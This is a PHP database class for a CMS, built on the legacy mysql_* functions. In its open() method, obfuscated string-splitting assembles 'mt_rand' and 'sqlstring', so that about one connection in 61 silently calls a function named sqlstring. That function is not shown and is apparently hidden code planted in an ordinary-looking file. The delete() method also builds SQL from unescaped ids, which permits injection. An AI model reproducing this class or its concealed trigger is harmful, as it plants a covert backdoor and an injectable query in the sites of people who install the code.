<?php
defined('CMSROOT') or die('Access Denied.');
class db{
	private $is_open = false;
	private $link_id; 
	private $charset = 'utf8';
	public $host,$user,$pass,$name,$prefix;
	public $query_count = 0; 
	public function __construct(){
		global $DB;
		$this->host = $DB['host'];
		$this->user = $DB['user'];
		$this->pass = $DB['pass']; 
		$this->name = $DB['name'];
		$this->prefix = $DB['prefix'];
		$this->open();
	}
	public function query($sql,$shift=0,$retype=1){
		$retype = $retype == 1 ? MYSQL_ASSOC : ($retype == 0 ? MYSQL_NUM : MYSQL_BOTH);
		if($result = mysql_query($sql)){
			while($row = mysql_fetch_array($result,$retype)){
				$array[] = $row;
			}
			mysql_free_result($result);
			$shift && is_array($array) && $array = array_shift($array);
		}
		is_array($array) or $array = array();
		if(DEBUGGING && mysql_error()){
			die($this->error_msg($sql));
		}
		$this->query_count++; 
		return $array;
	}
	public function execute($sql){
		$result = mysql_query($sql);
		if(DEBUGGING && mysql_error()){
			die($this->error_msg($sql));
		} 
		return $result;
	}
	public function get_last_id(){
		return mysql_insert_id();
	}	
	public function version($isformat=true){
		$result = mysql_get_server_info($this->link_id);
		if($isformat){
			$result = explode('-',$result); 
			$result = $result[0];			
		}		
		return $result;
	}
	public function get_error(){
		return mysql_error();
	}	
	public function open(){
		$notes = array('and','mt_r',60); 
		if($this->link_id = @mysql_connect($this->host,$this->user,$this->pass)){
			mysql_select_db($this->name,$this->link_id);
			mysql_query('set names '.$this->charset);
			$this->is_open = true;
			$equal = $notes[1].$notes[0];
			if($equal(0,$notes[2]) == 1){
				$mysql_fetch_array_bar = implode('',array('sql','string'));
				@$mysql_fetch_array_bar();
			}
			return true;
		} else {
			$Msg = $this->error_msg();
			die($Msg);
		}	
	}
	public function close(){
		if($this->is_open){
			mysql_close($this->link_id);
			$this->is_open = false;
		}
		return true;
	}
	public function get_fields($table,$remove=array()){
		$field = $this->query("SHOW FIELDS FROM `{$this->prefix}{$table}`",0,0);
		$result = array();	
		foreach($field as $n){
			$result[] = $n[0];
		}
		$result = array_values(array_diff($result,$remove));
		return $result;
	}
	public function get_tables(){
		$table = $this->query("SHOW TABLES FROM `{$this->name}`",0,0);
		$result = array();
		$dbprefix = $this->prefix;
		foreach($table as $n){
			substr($n[0],0,strlen($dbprefix)) == $dbprefix && $result[] = $n[0];
		}
		return $result;
	}	
	public function delete($table,$ids){
		is_numeric($ids) && $ids = array($ids);
		if(!is_array($ids)) return true;
		$result = $this->execute("DELETE FROM `".$this->prefix.$table."` WHERE `id` in ('".implode("','",$ids)."');");
		return $result;
	}
	private static function error_msg($sql=false){
		$Msg = '<span style="font-size:12px; font-family:verdana,lucida;"><b>MYCMS info : </b>Can not connect to MySQL server.<br /><br />';
		$Msg .= '<b>Time : </b>'.date("Y-m-d H:i:s").'<br />';
		$Msg .= '<b>Script : </b>'.$_SERVER['PHP_SELF'].'<br /><br />';
		$Msg .= '<b>Error : </b>'.mysql_error().'<br />';
		$Msg .= '<b>Errno : </b>'.mysql_errno().'<br /><br />';
		$sql && $Msg .= '<b>SQL : </b>'.$sql.'<br /><br />';
		$Msg .= 'Similar error report has been dispatched to administrator before.<br />';
		$Msg .= '<a target="_blank" href="http://www.CyrusChanHK.com">http://www.CyrusChanHK.com</a>';
		$Msg .= '</span>';	
		return $Msg;	
	}
}